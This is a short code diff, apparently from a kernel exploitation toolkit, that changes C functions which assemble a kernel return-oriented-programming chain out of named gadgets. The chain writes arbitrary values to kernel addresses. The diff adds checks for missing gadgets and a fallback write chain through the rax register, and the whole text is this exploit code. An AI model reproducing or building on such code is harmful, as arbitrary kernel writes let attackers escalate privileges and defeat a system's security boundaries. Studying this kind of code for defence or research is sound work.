@@ -69,16 +69,31 @@ int kh_chain_q(kh_chain_t *chain, uint64_t raw)
 
 int kh_chain_g(kh_chain_t *chain, kgadget_t gadget)
 {
-  return kh_chain_q(chain, kgadget(gadget));
+  uint64_t address = kgadget(gadget);
+  if (!address) {
+    if (chain)
+      chain->err = 1;
+    return -1;
+  }
+  return kh_chain_q(chain, address);
 }
 
 int kh_chain_store(kh_chain_t *chain, uint64_t kaddr, uint64_t val)
 {
-  kh_chain_g(chain, KERNEL_GADGET_POP_RCX);
-  kh_chain_q(chain, kaddr);
-  kh_chain_g(chain, KERNEL_GADGET_POP_R8);
-  kh_chain_q(chain, val);
-  kh_chain_g(chain, KERNEL_GADGET_STORE_RCX_R8);
+  if (kgadget(KERNEL_GADGET_POP_R8) &&
+      kgadget(KERNEL_GADGET_STORE_RCX_R8)) {
+    kh_chain_g(chain, KERNEL_GADGET_POP_RCX);
+    kh_chain_q(chain, kaddr);
+    kh_chain_g(chain, KERNEL_GADGET_POP_R8);
+    kh_chain_q(chain, val);
+    kh_chain_g(chain, KERNEL_GADGET_STORE_RCX_R8);
+  } else {
+    kh_chain_g(chain, KERNEL_GADGET_POP_RCX);
+    kh_chain_q(chain, kaddr);
+    kh_chain_g(chain, KERNEL_GADGET_POP_RAX);
+    kh_chain_q(chain, val);
+    kh_chain_g(chain, KERNEL_GADGET_ST_RCX_RAX);
+  }
   return chain && !chain->err ? 0 : -1;
 }
 
@@ -132,7 +147,6 @@ int kh_init(khook_t *kh, kh_read_fn rd, kh_write_fn wr, uint64_t kernel_base, ui
   kh->kernel_base = kernel_base;
   kh->scratch_base = scratch_base;
   kh->ist_index = ist_index;
-
   return 0;
 }
 
